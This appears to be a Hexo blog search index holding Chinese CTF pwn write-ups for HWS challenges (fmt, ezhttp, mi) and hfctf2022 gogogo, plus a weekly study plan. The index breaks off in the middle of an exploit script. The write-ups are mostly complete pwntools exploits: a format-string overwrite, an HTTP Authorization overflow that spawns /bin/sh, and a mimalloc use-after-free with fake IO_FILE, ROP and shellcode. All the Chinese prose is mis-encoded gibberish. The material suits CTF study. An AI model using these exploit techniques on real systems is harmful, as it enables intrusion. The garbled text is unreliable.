<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HWS-PWN</title>
    <link href="/2023/07/17/HWS-PWN/"/>
    <url>/2023/07/17/HWS-PWN/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡æœ‰å¹¸èƒ½å°†ä¸‰é“pwné¢˜éƒ½è§£å‡ºäº†ï¼Œç¬¬ä¸€å¤©ä¸Šå¤§åˆ†ï¼Œä½†åªä¼šè§£pwnï¼Œç¬¬äºŒå¤©ä¸æ–­æ‰åˆ†ğŸ˜¢ã€‚</p><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>ç™½ç»™çš„ä¸¤æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæœ€åæ”¹__libc_start_mainä¸ºone_gangetå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;fmt&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./fmt&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30050</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;%18$p,%21$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0xe3b01</span><br>fmt_payload = fmtstr_payload(<span class="hljs-number">6</span>, &#123;(stack + <span class="hljs-number">8</span>) : one_gadget &amp; <span class="hljs-number">0xffffff</span>&#125;,  write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>payload = fmt_payload[:<span class="hljs-number">7</span>] + <span class="hljs-string">b&#x27;hh&#x27;</span> + fmt_payload[<span class="hljs-number">9</span>:]<br><span class="hljs-comment"># print(fmt_payload)</span><br><span class="hljs-comment"># print(payload)</span><br><span class="hljs-comment"># print(hex(one_gadget))</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                               </p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>è™½ç„¶é™åˆ¶äº†<code>..</code> ç¬¦å·çš„ä½¿ç”¨ï¼Œä½†æ˜¯åœ¨sub_1766å‡½æ•°ä¸­æœ‰ä¸ªè½¬base64çš„æ“ä½œï¼Œå¤§å°æ²¡æœ‰é™åˆ¶ï¼Œå¯ä»¥ç›´æ¥æº¢å‡ºåˆ°haystackï¼Œå†åˆ©ç”¨<code>?</code> å»ç»•è¿‡æ–‡ä»¶åç¼€åçš„æ£€æµ‹ï¼Œæœ€ååˆ©ç”¨sub_2993å‡½æ•°ä¸­çš„execlå»æ‰§è¡Œ<code>/bin/sh</code></p><img src="/img/16/Screenshot 2023-07-16 122048.png" style="zoom:80%;" /><p>â€‹                              </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#p = remote(&#x27;127.0.0.1&#x27;, 4000)</span><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30092</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">b&#x27;GET / HTTP/1.1\r\n&#x27;</span><br>msg = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;/../../../bin/sh?faker.js&#x27;</span><br>payload += <span class="hljs-string">b&#x27;Authorization: Basic &#x27;</span> + base64.b64encode(msg) + <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span><br>pause()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)<br>pause()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                                         </p><h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><p>ç™½ç»™çš„uafï¼Œä¸»è¦æ˜¯mimallocçš„é—®é¢˜ï¼Œéšä¾¿è¯•äº†ä¸€ä¸‹ï¼Œå †åˆ†é…æ˜¯å°†ä¸€å—è¿ç»­çš„å†…å­˜ï¼ˆ0x10000ï¼‰åˆ’åˆ†ä¸ºç›¸åŒçš„å¤§å°çš„chunkï¼Œæœ‰ç‚¹åƒslabã€‚</p><p>ä¸glibcä¸åŒï¼ŒåŒä¸€å¤§å°çš„å †å—åˆ†é…chunkçš„é“¾è¡¨å’Œé‡Šæ”¾chunkçš„é“¾è¡¨æ˜¯ä¸åŒçš„ï¼Œåªæœ‰å½“åˆ†é…chunkçš„é“¾è¡¨ä¸­çš„chunkç”¨å°½äº†ï¼Œæ‰å»ä½¿ç”¨é‡Šæ”¾chunkçš„é“¾è¡¨ï¼ˆè¯­è¨€è¡¨è¿°å¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œå¦‚æœæ²¡æœ‰getåˆ°æˆ‘è¯´çš„ç‚¹ï¼Œå°±å¤šè°ƒè¯•ä¸€ä¸‹å§ï¼‰ã€‚</p><img src="/img/16/Screenshot 2023-07-16 125025.png" style="zoom:80%;" /><p>å…ˆæ³„æ¼å †åœ°å€ï¼Œåœ¨å †åŸºå€+0x240å¤„æœ‰libmimalloc.so.2çš„åœ°å€ï¼Œåç§»ä¸glibcå›ºå®šï¼Œæ³„æ¼åæ”¹IO_2_1_stdoutï¼Œåˆ©ç”¨house of catå»æ ˆè¿ç§»ã€‚</p><p>libmimalloc.so.2å’Œglibcçš„åç§»æœ¬åœ°å’Œè¿œç¨‹ä¸ä¸€æ ·ï¼Œè¿˜è¦å»çˆ†ç ´è¿™ä¸ªåç§»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#p = remote(&#x27;60.204.140.184&#x27;,30175)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    add(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        delete(i)<br><br>    show(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x30780</span><br><br>    add(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">5</span>)<br>    edit(<span class="hljs-number">4</span>, p64(heap_addr + <span class="hljs-number">0x2c0</span>))<br>    add(<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">0x310</span>, p64(heap_addr + <span class="hljs-number">0x240</span>))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    show(<span class="hljs-number">7</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-comment">#libcbase = leak - 0x22820 - 0x1f4000</span><br>    <span class="hljs-comment">#libcbase = leak - 0x228820 - i * 0x20</span><br>    libcbase = leak - <span class="hljs-number">0x22820</span> - <span class="hljs-number">0x1f4000</span> + <span class="hljs-number">2</span> * <span class="hljs-number">0x1000</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">0x400</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        delete(i + <span class="hljs-number">9</span>)<br><br><br>    IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>    pop_rdi_ret = libcbase + <span class="hljs-number">0x23b6a</span><br>    pop_rsi_ret = libcbase + <span class="hljs-number">0x2601f</span><br>    pop_rdx_ret = libcbase + <span class="hljs-number">0x142c92</span><br>    magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br>    <span class="hljs-comment">#fake_addr = IO_2_1_stdout</span><br><br>    faker_addr = heap_addr + <span class="hljs-number">0x50c80</span><br>    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) <br>    payload += p64(faker_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdi_ret + <span class="hljs-number">1</span>)<br>    payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>    payload += flat(<br>        pop_rdi_ret, ((faker_addr + <span class="hljs-number">0x100</span>) &gt;&gt; <span class="hljs-number">12</span>) &lt;&lt; <span class="hljs-number">12</span>,<br>        pop_rsi_ret, <span class="hljs-number">0x2000</span>,<br>        pop_rdx_ret, <span class="hljs-number">7</span>,<br>        libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>],<br>        faker_addr + <span class="hljs-number">0x140</span><br>    )<br>    payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br><br>    edit(<span class="hljs-number">12</span>, p64(IO_2_1_stdout))<br>    add(<span class="hljs-number">0x400</span>, payload)<br><br>    fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x50c80</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>    fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE += p64(heap_addr)<br>    fake_IO_FILE += p64(magic_gadget)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>    fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    add(<span class="hljs-number">0x400</span>, fake_IO_FILE)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30191</span>)<br><span class="hljs-comment">#p = remote(&#x27;172.17.0.1&#x27;, 9999)</span><br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>exp()<br>p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ¯å‘¨è®¡åˆ’&amp;&amp;æ¯å‘¨æ€»ç»“</title>
    <link href="/2023/07/16/%E6%AF%8F%E5%91%A8%E8%AE%A1%E5%88%92/"/>
    <url>/2023/07/16/%E6%AF%8F%E5%91%A8%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<p>ç£ä¿ƒè‡ªå·±åˆ«æ‘†çƒ‚ã€‚</p><h3 id="2023-7-17-2023-7-23"><a href="#2023-7-17-2023-7-23" class="headerlink" title="2023.7.17-2023.7.23"></a>2023.7.17-2023.7.23</h3><ul><li>å¤ç°è‡³å°‘4é“è¿‘å¹´æ¥å¤§å‹ctfæ¯”èµ›çš„pwné¢˜</li><li>å­¦ä¹ å›ºä»¶è§£å¯†</li><li>ç†Ÿè®°æ˜Ÿç«è‹±è¯­å…­çº§è¯æ±‡ä¸­çš„ä¸¤ä¸ªlistï¼ˆå¤§äºŒéƒ½ç»“æŸäº†ï¼Œå…­çº§è¿˜æ²¡æœ‰è¿‡ï¼‰</li><li>æœ‰æ—¶é—´çœ‹çœ‹v8çš„æ¼æ´ï¼ˆä¸»è¦å¥½å¥‡jsæ´æ˜¯å’‹æ ·çš„ï¼Œå½“ç„¶ä¸ä¸€å®šå­¦å¾—ä¸‹å»ï¼‰</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hfctf2022</title>
    <link href="/2023/07/06/hfctf2022/"/>
    <url>/2023/07/06/hfctf2022/</url>
    
    <content type="html"><![CDATA[<p>ä»Šå¹´çš„å¤©æ´¥å¸‚çš„ctfæ¯”èµ›ç«Ÿç„¶ä½¿ç”¨å¥‡å®‰ä¿¡çš„å¹³å°ï¼Œæƒ³åˆ°å»å¹´çš„å¸‚èµ›ä¸çŸ¥é“ç”¨è°å®¶çš„å¹³å°ï¼Œè¿ä¸ªpwnçš„é¶æœºéƒ½æ²¡æå¥½ï¼Œä½“éªŒå·¨å·®ï¼Œä»Šå¹´å¥‡å®‰ä¿¡çš„å¹³å°å°±éå¸¸èˆ’æœã€‚</p><p>å¤©æ´¥å¸‚çš„ctfæ¯”èµ›å…¨æ˜¯å…¥é—¨é¢˜ï¼Œæ²¡ä»€ä¹ˆå¯è¯´çš„ã€‚åæ¥æˆ‘çœ‹åˆ°å¥‡å®‰ä¿¡çš„å¹³å°ä¸Šè¿˜æœ‰å­˜æœ‰å»å¹´è™ç¬¦ctfçš„é¢˜ï¼Œè‡ªå·±å°±è¯•ç€å¤ç°ä¸€ä¸‹ã€‚</p><p>ç½‘ä¸Šå…¶ä»–å¸ˆå‚…ä¹Ÿéƒ½å¤ç°è¿‡ï¼Œå»ºè®®ç›´æ¥çœ‹è¿™äº›å¸ˆå‚…çš„åšå®¢ï¼š</p><p><a href="https://kpwnz.github.io/2022/03/23/%E8%99%8E%E7%AC%A62022-pwn-%E5%A4%8D%E7%8E%B0/">https://kpwnz.github.io/2022/03/23/%E8%99%8E%E7%AC%A62022-pwn-%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://bbs.kanxue.com/thread-271978.htm">https://bbs.kanxue.com/thread-271978.htm</a></p><p><a href="https://www.xi4oyu.top/cdcd3a27">https://www.xi4oyu.top/cdcd3a27</a></p><p>â€‹                                                                                     </p><h3 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h3><p>çœŸä½©æœå‡ºé¢˜äººçš„è„‘æ´ï¼Œæ‹¿ä¸ªmain__mainå‡½æ•°è¿·æƒ‘ä½ ï¼ŒçœŸæ­£çš„ä¸»å‡½æ•°æ˜¯math_initå‡½æ•°ï¼Œé‡Œé¢çš„å­—ç¬¦ä¸²ç«Ÿç„¶æ˜¯ç”±ä¸€ä¸ªä¸€ä¸ªå­—æ¯æ‰“å°å‡ºæ¥çš„</p><img src="/img/15/Screenshot 2023-07-10 141548.png" style="zoom:80%;" /><p>è¿™é‡Œå‚è€ƒäº†ä¸€ä¸‹<a href="https://www.hex-rays.com/products/ida/support/idadoc/1361.shtml">idaçš„user_callæ•™ç¨‹</a>ï¼Œæ”¹å˜ä¸€ä¸‹å‡½æ•°å‚æ•°è°ƒç”¨è§„åˆ™ï¼Œè®©ä¼ªä»£ç æ›´å¥½çœ‹ã€‚æœ€åçš„æ¼æ´æ˜¯åœ¨é€šè¿‡BULLS AND COWSçš„æ¸¸æˆåè¿›å…¥exité€‰é¡¹åçš„æ ˆæº¢å‡ºï¼ˆæ­£å¸¸äººå“ªæƒ³å¾—åˆ°ï¼‰ã€‚</p><p>æœ€åçš„expå‚è€ƒäº†<a href="https://blog.csdn.net/weixin_44946764/article/details/125211885">è¿™ç¯‡åšå®¢çš„BULLS AND COWSçš„è§£æ³•</a>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;gogogo&#x27;</span>)<br><span class="hljs-comment">#sh = process(&#x27;./gogogo&#x27;)</span><br>sh = remote(<span class="hljs-string">&#x27;112.74.186.148&#x27;</span>, <span class="hljs-number">49363</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#p.sendlineafter(b&#x27;:&#x27;, b&#x27;305419896&#x27;)</span><br><span class="hljs-comment">#p.sendlineafter(b&#x27;:&#x27;, b&#x27;1717986918&#x27;)</span><br>sh.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1416925456&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;GUESS\n&#x27;</span>)<br>li = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>]<br>guessli = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>    <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> li:<br>        <span class="hljs-keyword">if</span> u == i:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> li:<br>            <span class="hljs-keyword">if</span> u == o <span class="hljs-keyword">or</span> o == i:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> li:<br>                <span class="hljs-keyword">if</span> p == o <span class="hljs-keyword">or</span> p == u <span class="hljs-keyword">or</span> p == i:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">else</span>:<br>                    four = p<br>                    guessli.append([i,u,o,p])<br><br>total = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> guess <span class="hljs-keyword">in</span> guessli:<br>    total += <span class="hljs-number">1</span><br>    time.sleep(<span class="hljs-number">1</span>)<br>    num = <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">0</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">1</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">2</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">3</span>])<br>    <span class="hljs-comment">#print(num)</span><br>    sh.sendline(num.encode())<br>    